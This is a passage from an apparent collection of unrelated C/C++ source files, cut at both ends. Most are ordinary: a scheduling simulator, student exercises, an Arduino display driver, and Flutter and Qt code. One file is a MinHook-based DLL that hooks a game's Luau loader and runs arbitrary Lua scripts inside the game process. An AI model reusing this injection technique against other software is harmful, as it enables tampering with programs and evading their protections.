\"+*ver);\n\n\tHDC hdc;\n\tPAINTSTRUCT ps;\n\tHFONT ft1,ft2;\n\tRECT rect,content_rect;\n\tHWND f1;\n\tGetWindowRect(hwnd, &rect);\n\tint height = 0;\n\n\tcontent_rect = rect;\n\tcontent_rect.top = content_rect.bottom = (content_rect.top + content_rect.bottom) / 2;\n\n\tft1 = CreateFont\n\t(\n\t\t50, 0,    //\u9ad8\u5ea620, \u5bbd\u53d60\u8868\u793a\u7531\u7cfb\u7edf\u9009\u62e9\u6700\u4f73\u503c\n\t\t0, 0,    //\u6587\u672c\u503e\u659c\uff0c\u4e0e\u5b57\u4f53\u503e\u659c\u90fd\u4e3a0\n\t\tFW_HEAVY,    //\u7c97\u4f53\n\t\t0, 0, 0,        //\u975e\u659c\u4f53\uff0c\u65e0\u4e0b\u5212\u7ebf\uff0c\u65e0\u4e2d\u5212\u7ebf\n\t\tGB2312_CHARSET,    //\u5b57\u7b26\u96c6\n\t\tOUT_DEFAULT_PRECIS,\n\t\tCLIP_DEFAULT_PRECIS,\n\t\tDEFAULT_QUALITY,        //\u4e00\u7cfb\u5217\u7684\u9ed8\u8ba4\u503c\n\t\tDEFAULT_PITCH | FF_DONTCARE,\n\t\tTEXT(\"\u5b8b\u4f53\")   //\u5b57\u4f53\u540d\u79f0\n\t);\n\tft2 = CreateFont\n\t(\n\t\t15, 0,    //\u9ad8\u5ea620, \u5bbd\u53d60\u8868\u793a\u7531\u7cfb\u7edf\u9009\u62e9\u6700\u4f73\u503c\n\t\t0, 0,    //\u6587\u672c\u503e\u659c\uff0c\u4e0e\u5b57\u4f53\u503e\u659c\u90fd\u4e3a0\n\t\tFW_HEAVY,    //\u7c97\u4f53\n\t\t0, 0, 0,        //\u975e\u659c\u4f53\uff0c\u65e0\u4e0b\u5212\u7ebf\uff0c\u65e0\u4e2d\u5212\u7ebf\n\t\tGB2312_CHARSET,    //\u5b57\u7b26\u96c6\n\t\tOUT_DEFAULT_PRECIS,\n\t\tCLIP_DEFAULT_PRECIS,\n\t\tDEFAULT_QUALITY,        //\u4e00\u7cfb\u5217\u7684\u9ed8\u8ba4\u503c\n\t\tDEFAULT_PITCH | FF_DONTCARE,\n\t\tTEXT(\"\u5fae\u8f6f\u96c5\u9ed1\")   //\u5b57\u4f53\u540d\u79f0\n\t);\n\t\n\tswitch (message) {\n\tcase WM_DESTROY:\n\t\tPostQuitMessage(0);\n\t\tbreak;\n\tcase WM_PAINT:\n\t\thdc = BeginPaint(hwnd, &ps);\n\n\t\tSetTextColor(hdc, RGB(255, 252, 0));\n\t\tSetBkColor(hdc, RGB(0, 0, 0));\n\n\t\tSelectObject(hdc, ft1);\n\t\theight = DrawText(hdc, target->c_str(), target->size(), &content_rect, DT_CALCRECT | DT_CENTER | DT_VCENTER | DT_WORDBREAK);\n\t\tcontent_rect.top -= height / 2;\n\t\tcontent_rect.bottom += height / 2;\n\t\tcontent_rect.left = rect.left;\n\t\tcontent_rect.right = rect.right;\n\t\tDrawText(hdc, target->c_str(), target->size(), &content_rect, DT_CENTER  | DT_WORDBREAK);\n\t\tSetTextAlign(hdc, TA_CENTER);\n\t\tSetTextColor(hdc, RGB(255,255, 255));\n\t\tSelectObject(hdc, ft2);\n\t\tTextOut(hdc,  rect.right - 100, rect.bottom-30, ver_info.c_str(),ver_info.size());\n\t\tEndPaint(hwnd, &ps);\n\t\tbreak;\n\tdefault:\n\t\treturn DefWindowProc(hwnd, message, wparam,lparam);\n\t}\n\treturn 0;\n}",
    "#include <bits/stdc++.h>\n#include \"parser.h\"\n\n#define all(v) v.begin(), v.end()\n\nusing namespace std;\n\n/** Global Constants **/\nconst string TRACE = \"trace\";\nconst string SHOW_STATISTICS = \"stats\";\nconst string ALGORITHMS[9] = {\"\", \"FCFS\", \"RR-\", \"SPN\", \"SRT\", \"HRRN\", \"FB-1\", \"FB-2i\", \"AGING\"};\n\nbool sortByServiceTime(const tuple<string, int, int> &a, const tuple<string, int, int> &b)\n{\n    return (get<2>(a) < get<2>(b));\n}\nbool sortByArrivalTime(const tuple<string, int, int> &a, const tuple<string, int, int> &b)\n{\n    return (get<1>(a) < get<1>(b));\n}\n\nbool descendingly_by_response_ratio(tuple<string, double, int> a, tuple<string, double, int> b)\n{\n    return get<1>(a) > get<1>(b);\n}\n\nbool byPriorityLevel (const tuple<int,int,int>&a,const tuple<int,int,int>&b){\n    if(get<0>(a)==get<0>(b))\n        return get<2>(a)> get<2>(b);\n    return get<0>(a) > get<0>(b);\n}\n\nvoid clear_timeline()\n{\n    for(int i=0; i<last_instant; i++)\n        for(int j=0; j<process_count; j++)\n            timeline[i][j] = ' ';\n}\n\nstring getProcessName(tuple<string, int, int> &a)\n{\n    return get<0>(a);\n}\n\nint getArrivalTime(tuple<string, int, int> &a)\n{\n    return get<1>(a);\n}\n\nint getServiceTime(tuple<string, int, int> &a)\n{\n    return get<2>(a);\n}\n\nint getPriorityLevel(tuple<string, int, int> &a)\n{\n    return get<2>(a);\n}\n\ndouble calculate_response_ratio(int wait_time, int service_time)\n{\n    return (wait_time + service_time)*1.0 / service_time;\n}\n\nvoid fillInWaitTime(){\n    for (int i = 0; i < process_count; i++)\n    {\n        int arrivalTime = getArrivalTime(processes[i]);\n        for (int k = arrivalTime; k < finishTime[i]; k++)\n        {\n            if (timeline[k][i] != '*')\n                timeline[k][i] = '.';\n        }\n    }\n}\n\nvoid firstComeFirstServe()\n{\n    int time = getArrivalTime(processes[0]);\n    for (int i = 0; i < process_count; i++)\n    {\n        int processIndex = i;\n        int arrivalTime = getArrivalTime(processes[i]);\n        int serviceTime = getServiceTime(processes[i]);\n\n        finishTime[processIndex] = (time + serviceTime);\n        turnAroundTime[processIndex] = (finishTime[processIndex] - arrivalTime);\n        normTurn[processIndex] = (turnAroundTime[processIndex] * 1.0 / serviceTime);\n\n        for (int j = time; j < finishTime[processIndex]; j++)\n            timeline[j][processIndex] = '*';\n        for (int j = arrivalTime; j < time; j++)\n            timeline[j][processIndex] = '.';\n        time += serviceTime;\n    }\n}\n\nvoid roundRobin(int originalQuantum)\n{\n    queue<pair<int,int>>q;\n    int j=0;\n    if(getArrivalTime(processes[j])==0){\n        q.push(make_pair(j,getServiceTime(processes[j])));\n        j++;\n    }\n    int currentQuantum = originalQuantum;\n    for(int time =0;time<last_instant;time++){\n        if(!q.empty()){\n            int processIndex = q.front().first;\n            q.front().second = q.front().second-1;\n            int remainingServiceTime = q.front().second;\n            int arrivalTime = getArrivalTime(processes[processIndex]);\n            int serviceTime = getServiceTime(processes[processIndex]);\n            currentQuantum--;\n            timeline[time][processIndex]='*';\n            while(j<process_count && getArrivalTime(processes[j])==time+1){\n                q.push(make_pair(j,getServiceTime(processes[j])));\n                j++;\n            }\n\n            if(currentQuantum==0 && remainingServiceTime==0){\n                finishTime[processIndex]=time+1;\n                turnAroundTime[processIndex] = (finishTime[processIndex] - arrivalTime);\n                normTurn[processIndex] = (turnAroundTime[processIndex] * 1.0 / serviceTime);\n                currentQuantum=originalQuantum;\n                q.pop();\n            }else if(currentQuantum==0 && remainingServiceTime!=0){\n                q.pop();\n                q.push(make_pair(processIndex,remainingServiceTime));\n                currentQuantum=originalQuantum;\n            }else if(currentQuantum!=0 && remainingServiceTime==0){\n                finishTime[processIndex]=time+1;\n                turnAroundTime[processIndex] = (finishTime[processIndex] - arrivalTime);\n                normTurn[processIndex] = (turnAroundTime[processIndex] * 1.0 / serviceTime);\n                q.pop();\n                currentQuantum=originalQuantum;\n            }\n        }\n        while(j<process_count && getArrivalTime(processes[j])==time+1){\n            q.push(make_pair(j,getServiceTime(processes[j])));\n            j++;\n        }\n    }\n    fillInWaitTime();\n}\n\nvoid shortestProcessNext()\n{\n    priority_queue<pair<int, int>, vector<pair<int, int>>, greater<pair<int, int>>> pq; // pair of service time and index\n    int j = 0;\n    for (int i = 0; i < last_instant; i++)\n    {\n        while(j<process_count && getArrivalTime(processes[j]) <= i){\n            pq.push(make_pair(getServiceTime(processes[j]), j));\n            j++;\n        }\n        if (!pq.empty())\n        {\n            int processIndex = pq.top().second;\n            int arrivalTime = getArrivalT",
    "/*\n14 & 15. Develop a class Score that tracks a player's score in a game. Implement the \nfollowing:\n1. Data Member:\no An int data member to store the score.\n2. Constructors:\no A default constructor to initialize the score to 0.\no A parameterized constructor to initialize the score to a specific value.\n3. Overloaded Operators:\no Overload the pre-increment (++) operator to increase the score by 10 points \nand return the updated object.\no Overload the post-increment (++) operator to increase the score by 10 points \nbut return the original object before the increment.\n4. Main Function:\no Create a Score object, demonstrate the use of both pre-increment and post\u0002increment operators, and display the score after each operation\n*/\n\n#include<iostream>\n#include<iomanip>\nusing namespace std;\n\nclass Score {\nprivate:\n    int score;\n\u1e47public:\n    Score() : score(0) {}\n    Score(int s) : score(s) {}\n\n    friend Score& operator++(Score&);\n    friend Score operator++(Score&, int);\n\n    void display() const {\n        cout << \"Score: \" << score << endl;\n    }\n};\n\nScore& operator++(Score& obj) {\n    obj.score += 10;\n    return obj;\n}\n\nScore operator++(Score& obj, int) {\n    Score temp = obj;\n    obj.score += 10;\n    return temp;\n}\n\nint main() {\n    Score playerScore(50);\n\n    cout << \"Initial \";\n    playerScore.display();\n\n    ++playerScore;\n    cout << \"After pre-increment \";\n    playerScore.display();\n\n    playerScore++;\n    cout << \"After post-increment \";\n    playerScore.display();\n    cout<<endl;\n    cout << \"*********************************************\" << endl; \n    cout << \"Program Prepared & Executed by: GAURAV SINGH, CSE(A1) ,Class Roll no: 32\" << endl; \n    cout << \"*********************************************\" << endl; \n    return 0;\n}\n\n",
    "#include \"FourDigits_7segments_74HC595.h\"\n#include <Arduino.h>\n\nFourDigits_7segments_74HC595::FourDigits_7segments_74HC595(uint8_t input, uint8_t clk, uint8_t latch){\n    _input = input;\n    _clk = clk;\n    _latch = latch;\n\n    pinMode(_input, OUTPUT);\n    pinMode(_clk, OUTPUT);\n    pinMode(_latch, OUTPUT);\n}\n\nvoid FourDigits_7segments_74HC595::clear(bool anim = false){\n    digitalWrite(_input, HIGH);\n\n    for (uint8_t i = 0; i < 32; i++)\n    {\n        digitalWrite(_clk, HIGH);\n        if(anim) {digitalWrite(_latch, HIGH); delay(animDelay);}\n        digitalWrite(_clk, LOW);\n        if(anim) digitalWrite(_latch, LOW);\n    }\n    \n    if(!anim){\n        digitalWrite(_latch, HIGH);\n        digitalWrite(_latch, LOW);\n    }\n    \n}\n\nvoid FourDigits_7segments_74HC595::SegmentPrint(uint8_t status, bool visible){\n    if(status == HIGH) status = LOW;\n    else status = HIGH;\n\n    digitalWrite(_input, status);\n    digitalWrite(_clk, HIGH);\n    digitalWrite(_clk,LOW);\n    digitalWrite(_input, LOW);\n\n    \n\n    if(visible){\n        digitalWrite(_latch, HIGH);\n        digitalWrite(_latch, LOW);\n        delay(animDelay);\n    }\n    \n}\n\nvoid FourDigits_7segments_74HC595::Create1(bool dot, bool anim = false){\n    if(dot) SegmentPrint(HIGH, anim);\n    else SegmentPrint(LOW, anim);\n\n    for(uint8_t i = 0; i < 4; i++) SegmentPrint(LOW, anim);\n    for(uint8_t i = 0; i < 2; i++) SegmentPrint(HIGH, anim);\n\n    SegmentPrint(LOW, anim);\n}\n\nvoid FourDigits_7segments_74HC595::Create2(bool dot, bool anim = false){\n    if(dot) SegmentPrint(HIGH, anim);\n    else SegmentPrint(LOW, anim);\n\n    SegmentPrint(HIGH, anim);\n    SegmentPrint(LOW, anim);\n    SegmentPrint(HIGH, anim);\n    SegmentPrint(HIGH, anim);\n    SegmentPrint(LOW, anim);\n    SegmentPrint(HIGH, anim);\n    SegmentPrint(HIGH, anim);\n}\n\nvoid FourDigits_7segments_74HC595::Create3(bool dot, bool anim = false){\n    if(dot) SegmentPrint(HIGH, anim);\n    else SegmentPrint(LOW, anim);\n\n    SegmentPrint(HIGH, anim);\n    SegmentPrint(LOW, anim);\n    SegmentPrint(LOW, anim);\n\n    for(uint8_t i = 0; i < 4; i++) SegmentPrint(HIGH, anim);\n}\n\nvoid FourDigits_7segments_74HC595::Create4(bool dot, bool anim = false){\n    if(dot) SegmentPrint(HIGH, anim);\n    else SegmentPrint(LOW, anim);\n\n    SegmentPrint(HIGH, anim);\n    SegmentPrint(HIGH, anim);\n    SegmentPrint(LOW, anim);\n    SegmentPrint(LOW, anim);\n    SegmentPrint(HIGH, anim);\n    SegmentPrint(HIGH, anim);\n    SegmentPrint(LOW, anim);\n\n\n}\n\nvoid FourDigits_7segments_74HC595::Create5(bool dot, bool anim = false){\n    if(dot) SegmentPrint(HIGH, anim);\n    else SegmentPrint(LOW, anim);\n\n    SegmentPrint(HIGH, anim);\n    SegmentPrint(HIGH, anim);\n\n    SegmentPrint(LOW, anim);\n    \n    SegmentPrint(HIGH, anim);\n    SegmentPrint(HIGH, anim);\n    SegmentPrint(LOW, anim);\n    SegmentPrint(HIGH, anim);\n\n}\n\nvoid FourDigits_7segments_74HC595::Create6(bool dot, bool anim = false){\n    if(dot) SegmentPrint(HIGH, anim);\n    else SegmentPrint(LOW, anim);\n\n    for(uint8_t i = 0; i < 5; i++) SegmentPrint(HIGH, anim);\n    SegmentPrint(LOW, anim);\n    SegmentPrint(HIGH, anim);\n}\n\nvoid FourDigits_7segments_74HC595::Create7(bool dot, bool anim = false){\n    if(dot) SegmentPrint(HIGH, anim);\n    else SegmentPrint(LOW, anim);\n\n    \n    for(uint8_t i = 0; i < 4; i++) SegmentPrint(LOW, anim);\n    for(uint8_t i = 0; i < 3; i++) SegmentPrint(HIGH, anim);\n}\n\nvoid FourDigits_7segments_74HC595::Create8(bool dot, bool anim = false){\n    if(dot) SegmentPrint(HIGH, anim);\n    else SegmentPrint(LOW, anim);\n\n    for(uint8_t i = 0; i < 7; i++) SegmentPrint(HIGH, anim);\n}\n\nvoid FourDigits_7segments_74HC595::Create9(bool dot, bool anim = false){\n    if(dot) SegmentPrint(HIGH, anim);\n    else SegmentPrint(LOW, anim);\n\n    SegmentPrint(HIGH, anim);\n    SegmentPrint(HIGH, anim);\n\n    SegmentPrint(LOW, anim);\n\n    for(uint8_t i = 0; i < 4; i++) SegmentPrint(HIGH, anim);\n}\n\nvoid FourDigits_7segments_74HC595::Create0(bool dot, bool anim = false){\n    if(dot) SegmentPrint(HIGH, anim);\n    else SegmentPrint(LOW, anim);\n\n    SegmentPrint(LOW, anim);\n\n    for(uint8_t i = 0; i < 6; i++) SegmentPrint(HIGH, anim);\n}\n\nvoid FourDigits_7segments_74HC595::CreateMinus(bool anim = false){\n    SegmentPrint(LOW, anim);\n    SegmentPrint(HIGH, anim);\n    \n    for(uint8_t i = 0; i < 6; i++) SegmentPrint(LOW, anim);\n}\n\nvoid FourDigits_7segments_74HC595::CreateBlank(bool anim = false){\n    for(uint8_t i = 0; i < 8; i++) SegmentPrint(LOW, anim);\n}\n\nvoid FourDigits_7segments_74HC595::intLogic(uint8_t num, bool anim){\n    switch (num)\n    {\n    case 0:\n        Create0(false, anim);\n        break;\n    case 1:\n        Create1(false, anim);\n        break;\n    case 2:\n        Create2(false, anim);\n        break;\n    case 3:\n        Create3(false, anim);\n        break;\n    case 4:\n        Create4(false, anim);\n        break;\n    case 5:\n        Create5(false, anim);\n        break;\n    case 6:\n        Create6(false, anim);\n        break;\n    case 7:\n        Create7(false, anim);\n        break;\n    case 8:\n        ",
    "/* Copyright (c) 2024 Otto Link. Distributed under the terms of the GNU General\n * Public License. The full license is in the file LICENSE, distributed with\n * this software. */\n\n#include \"attributes/map_enum_attribute.hpp\"\n\nnamespace attr\n{\n\nMapEnumAttribute::MapEnumAttribute(std::map<std::string, int> map,\n                                   const std::string         &label)\n    : AbstractAttribute(AttributeType::MAP_ENUM, label, BoundCheck::UNCHECKED), map(map)\n{\n  this->choice = map.begin()->first;\n  this->value = map.begin()->second;\n}\n\nMapEnumAttribute::MapEnumAttribute(std::string                choice,\n                                   std::map<std::string, int> map,\n                                   const std::string         &label)\n    : AbstractAttribute(AttributeType::MAP_ENUM, label, BoundCheck::UNCHECKED),\n      choice(choice), map(map)\n{\n  auto it = this->map.find(this->choice);\n\n  if (it != this->map.end())\n    this->value = it->second;\n  else\n  {\n    this->choice = map.begin()->first;\n    this->value = map.begin()->second;\n    Logger::log()->warn(\n        \"Warning: input choice not found in the map, default value set to 0 \"\n        \"(choice: {}).\",\n        this->choice);\n  }\n}\n\nvoid MapEnumAttribute::json_from(nlohmann::json const &json)\n{\n  AbstractAttribute::json_from(json);\n  this->value = json[\"value\"];\n  this->choice = json[\"choice\"];\n}\n\nnlohmann::json MapEnumAttribute::json_to() const\n{\n  nlohmann::json json = AbstractAttribute::json_to();\n  json[\"value\"] = this->value;\n  json[\"choice\"] = this->choice;\n  return json;\n}\n\n} // namespace attr\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sample_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#define _CRT_SECURE_NO_WARNINGS\n#include <Windows.h>\n\n#include <cstdio>\n#include <cstdint>\n#include <sstream>\n#include <optional>\n#include <iostream>\n#include <fstream>\n#include <filesystem>\n#include <MinHook.h>\n\n#include \"scanner.hpp\"\n#include \"pe.hpp\"\n#include \"util.hpp\"\n#include \"hook.hpp\"\n\nnamespace fs = std::filesystem;\nusing namespace std;\n\nstruct lua_State;\n\nlua_State* hsr_L;\nHMODULE xluau;\nHMODULE custom_xluau;\n\ntypedef int (WINAPI* pfn_load)(lua_State*, const char*, const char*, size_t, int);\ntypedef int (WINAPI* pfn_pcall)(lua_State*, int, int, int);\ntypedef int (WINAPI* pfn_settop)(lua_State*, int);\ntypedef lua_State* (WINAPI* pfn_newstate)();\ntypedef int (WINAPI* pfn_tolstring)(lua_State*, int, size_t*);\ntypedef int (WINAPI* pfn_loadbuffer)(lua_State*, const char*, size_t, const char*);\n\npfn_load luau_load = NULL;\npfn_pcall lua_pcall = NULL;\npfn_settop lua_settop = NULL;\npfn_newstate luaL_newstate = NULL;\npfn_tolstring lua_tolstring = NULL;\npfn_loadbuffer xluaL_loadbuffer = NULL;\n\nvoid get_hsr_L(lua_State* L)\n{\n    hsr_L = L;\n\n    // Init function address\n    lua_settop = (pfn_settop)GetProcAddress(xluau, \"lua_settop\");\n    lua_tolstring = (pfn_tolstring)GetProcAddress(xluau, \"lua_tolstring\");\n    xluaL_loadbuffer = (pfn_loadbuffer)GetProcAddress(xluau, \"xluaL_loadbuffer\");\n    lua_pcall = (pfn_pcall)GetProcAddress(xluau, \"lua_pcall\");\n\n    util::log(\"Waiting for Lua...\\n\");\n\n    while (hsr_L != 0) {\n        util::log(\"L: %p\\n\", hsr_L);\n        break;\n    }\n}\n\nstd::optional<fs::path> get_scripts_folder(const char* folder_name)\n{\n    auto mod_dir = util::this_dir();\n    if (!mod_dir)\n        return std::nullopt;\n\n    auto scripts_path = mod_dir.value() / folder_name;\n    if (fs::is_directory(scripts_path))\n        return scripts_path;\n\n    util::log(\"%s folder not found\\n\", folder_name);\n    return std::nullopt;\n}\n\nvoid exec(const char* compiled)\n{\n    int ret = xluaL_loadbuffer(hsr_L, compiled, strlen(compiled), \"HSRLua\");\n    if (ret != 0)\n    {\n        util::log(\"Loading failed(%i)\\n\", ret);\n        util::log(\"%s\\n\", lua_tolstring(hsr_L, 1, NULL));\n        lua_settop(hsr_L, 1);\n        return;\n    }\n\n    ret = lua_pcall(hsr_L, 0, 0, 0);\n    if (ret != 0)\n    {\n        util::log(\"Execution failed(%i)\\n\", ret);\n        util::log(\"%s\\n\", lua_tolstring(hsr_L, 1, NULL));\n        lua_settop(hsr_L, 1);\n    }\n}\n\nvoid load_lua_file(lua_State* L, const fs::path& file)\n{\n    auto name = file.filename().string();\n    util::log(\"Loading %s\\n\", name.c_str());\n\n    auto script = util::read_whole_file(file);\n    if (!script)\n    {\n        util::log(\"Failed reading file %s\\n\", name.c_str());\n        return;\n    }\n\n    exec(script.value().c_str());\n}\n\nvoid load_luas_from_dir(lua_State* L, const fs::path& dir)\n{\n    for (const auto& entry : fs::directory_iterator{ dir })\n    {\n        if (entry.is_regular_file() && entry.path().extension() == \".lua\")\n        {\n            load_lua_file(L, entry);\n        }\n    }\n}\n\nint WINAPI luau_load_replacement(lua_State* L, const char* chunkname, const char* data, size_t size, int env) {\n    string chunkname_str(chunkname);\n\n    if (chunkname_str == \"@BakedLua/MainEntry.bytes\")\n    {\n        get_hsr_L(L);\n    }\n    else if (chunkname_str == \"@BakedLua/Ui/GameStartup/LoginAgeHint.bytes\")\n    {\n        auto dir = get_scripts_folder(\"AutoLoad\");\n        if (!dir) return luau_load(L, chunkname, data, size, env);\n        for (const auto& entry : fs::directory_iterator{ dir.value() })\n        {\n            if (entry.is_regular_file() && entry.path().extension() == \".lua\")\n            {\n                util::log(\"Loading %s\\n\", entry.path().filename().string().c_str());\n                auto file = dir.value() / entry;\n                auto script = util::read_whole_file(file);\n                if (!script)\n                {\n                    util::log(\"Failed reading file %s\\n\", entry.path().filename().string().c_str());\n                    continue;\n                }\n                auto bytecode = script.value().c_str();\n\n                xluaL_loadbuffer(L, bytecode, strlen(bytecode), \"HSRLua\");\n                lua_pcall(L, 0, 0, 0);\n            }\n        }\n    }\n    \n    return luau_load(L, chunkname, data, size, env);\n}\n\nvoid command_loop(lua_State* L, fs::path& scripts)\n{\n    util::log(\"Type 'loadall' to load all scripts\\n\");\n    util::log(\"Type 'load <filename> ...' to load specific scripts\\n\");\n    util::log(\"WARNING: If you are executing scripts with Reflection, please place the scripts into AutoLoad folder\\n\");\n\n    while (true)\n    {\n        std::string input;\n        std::getline(std::cin, input);\n        auto cmd = util::split(input, ' ');\n        if (cmd.empty())\n            continue;\n        auto nargs = cmd.size() - 1;\n\n        if (cmd[0] == \"loadall\")\n        {\n            load_luas_from_dir(L, scripts);\n        }\n        else if (cmd[0] == \"load\")\n        {\n            for (int i = 0; i < nargs; i++)\n            {\n                auto file = scripts / cmd[i+1];\n   ",
    "\ufeff#include \"pluginspecification.h\"\n#include <QFileInfo>\n#include <QHashFunctions>\n#include <QJsonArray>\n#include <QJsonDocument>\n#include <QDir>\n#include <QLoggingCategory>\n#include <utils/hostinfo.h>\n#include <utils/stringutils.h>\n#include \"pluginmanager.h\"\n#include \"extensionsystemtr.h\"\n#include \"iplugin.h\"\n\n\nQ_LOGGING_CATEGORY(pluginLog, \"qtc.extensionsystem\", QtWarningMsg)\n\nnamespace ExtensionSystem {\n\nnamespace Constants\n{\nconst char kPluginMetadata[] = \"MetaData\";\nconst char kPluginName[] = \"Name\";\nconst char kPluginVersion[] = \"Version\";\nconst char kPluginCompatversion[] = \"CompatVersion\";\nconst char kPluginRequired[] = \"Required\";\nconst char kPluginExperimental[] = \"Experimental\";\nconst char kPluginDisabledByDefault[] = \"DisabledByDefault\";\nconst char kVendor[] = \"Vendor\";\nconst char kCopyright[] = \"Copyright\";\nconst char kLicense[] = \"License\";\nconst char kDescription[] = \"Description\";\nconst char kLongDescription[] = \"LongDescription\";\nconst char kUrl[] = \"Url\";\nconst char kCategory[] = \"Category\";\nconst char kPlatform[] = \"Platform\";\nconst char kDependencies[] = \"Dependencies\";\nconst char kDependencyName[] = \"Name\";\nconst char kDependencyVersion[] = \"Version\";\nconst char kDependencyType[] = \"Type\";\nconst char kDependencyTypeSoft[] = \"optional\";\nconst char kDependencyTypeHard[] = \"required\";\nconst char kDependencyTypeTest[] = \"test\";\nconst char kArguments[] = \"Arguments\";\nconst char kArgumentName[] = \"Name\";\nconst char kArgumentParameter[] = \"Parameter\";\nconst char kArgumentDescription[] = \"Description\";\nconst char versionRegExp[] = \"^([0-9]+)(?:[.]([0-9]+))?(?:[.]([0-9]+))?(?:_([0-9]+))?$\";\n}\nnamespace Helpers\n{\nstatic inline QString msgValueMissing(const char *key)\n{\n    return Tr::tr(\"\\\"%1\\\" is missing\").arg(QLatin1String(key));\n}\n\nstatic inline QString msgValueIsNotAString(const char *key)\n{\n    return Tr::tr(\"Value for key \\\"%1\\\" is not a string\")\n        .arg(QLatin1String(key));\n}\n\nstatic inline QString msgValueIsNotABool(const char *key)\n{\n    return Tr::tr(\"Value for key \\\"%1\\\" is not a bool\")\n        .arg(QLatin1String(key));\n}\n\nstatic inline QString msgValueIsNotAObjectArray(const char *key)\n{\n    return Tr::tr(\"Value for key \\\"%1\\\" is not an array of objects\")\n        .arg(QLatin1String(key));\n}\n\nstatic inline QString msgValueIsNotAMultilineString(const char *key)\n{\n    return Tr::tr(\"Value for key \\\"%1\\\" is not a string and not an array of strings\")\n        .arg(QLatin1String(key));\n}\n\nstatic inline QString msgInvalidFormat(const char *key, const QString &content)\n{\n    return Tr::tr(\"Value \\\"%2\\\" for key \\\"%1\\\" has invalid format\")\n        .arg(QLatin1String(key), content);\n}\n\nstatic inline bool isValidVersion(const QString &version)\n{\n    return QRegularExpression(Constants::versionRegExp).match(version).hasMatch();\n}\n\n}\n\n\nQString PluginSpecification::name() const\n{\n    return m_name;\n}\n\nQString PluginSpecification::version() const\n{\n    return m_version;\n}\n\nQString PluginSpecification::compatVersion() const\n{\n    return m_compatVersion;\n}\n\nQString PluginSpecification::vendor() const\n{\n    return m_vendor;\n}\n\nQString PluginSpecification::category() const\n{\n    return m_category;\n}\n\nQString PluginSpecification::description() const\n{\n    return m_description;\n}\n\nQString PluginSpecification::longDescription() const\n{\n    return m_longDescription;\n}\n\nQString PluginSpecification::url() const\n{\n    return m_url;\n}\n\nQString PluginSpecification::revision() const\n{\n    return m_revision;\n}\n\nQString PluginSpecification::location() const\n{\n    return m_location;\n}\n\nQString PluginSpecification::copyright() const\n{\n    return m_copyright;\n}\n\nQString PluginSpecification::license() const\n{\n    return m_license;\n}\n\nQRegularExpression PluginSpecification::platformSpecificationRegExp() const\n{\n    return m_platformSpecification;\n}\n\nIPlugin *PluginSpecification::plugin() const\n{\n    return m_plugin;\n}\n\nbool PluginSpecification::isRequired() const\n{\n    return m_required;\n}\n\nbool PluginSpecification::isExperimental() const\n{\n    return m_experimental;\n}\n\nbool PluginSpecification::isEnabledByDefault() const\n{\n    return m_enabledByDefault;\n}\n\nbool PluginSpecification::isEnabledBySettings() const\n{\n    return m_enabledBySettings;\n}\n\nQJsonObject PluginSpecification::metaData() const\n{\n    return m_metaData;\n}\n\nPluginState PluginSpecification::state() const\n{\n    return m_state;\n}\n\nQVector<PluginDependency> PluginSpecification::dependencies() const\n{\n    return m_dependencies;\n}\n\nQHash<PluginDependency, PluginSpecification *> PluginSpecification::dependencySpecifications() const\n{\n    return m_dependencySpecifications;\n}\n\nQStringList PluginSpecification::arguments() const\n{\n    return m_arguments;\n}\n\nQVector<PluginArgumentDescription> PluginSpecification::argumentDescriptions() const\n{\n    return m_argumentDescriptions;\n}\n\nbool PluginSpecification::initializeExtensions()\n{\n    if (m_errorString)\n        return false;\n    if (m_state != PluginState::Initialized) {\n        if (m_state == PluginState::Running)",
    "#include <iostream>\nusing namespace std;\n\n/*The program is to require the user to enter a positive integer num, and print out the num's elements in the Fibonacci sequence.*/\n\nint fib(int n); //declare the fib function\n\n/* The main frame */\nint main() {\n    int num, result;\n    cout<<\"Please enter a positive integer: \";\n    cin>>num;\n    result = fib(num); //call the fib function \n    cout<<result;\n    return 0;\n}\n\n/* The fib function frame */\nint fib(int n){\n    int result, preResult,prePreResult, i;\n    if (n == 1 || n == 2){ //when the num is 1 or 2, the accordingly element is 1\n        result = 1;\n    }\n    else {\n        i = 3; //initialize the loop count\n        prePreResult = 1; //initialize the (num-2)'s element\n        preResult = 1; //initialize the (num-1)'s element\n        result = prePreResult + preResult; //initialize the num's element\n        while (i < n){\n            prePreResult = preResult; //the value of (num-1)'s element is given to the (num-2)'s element\n            preResult = result; //the value of num's element is given to the (num-1)'s element\n            result = prePreResult + preResult; //the value of num's element is the sum of (num-1)'s element and (num-2)'s element\n            i++;\n        } \n    }\n    return result; //return to value of the  num's element to main\n}",
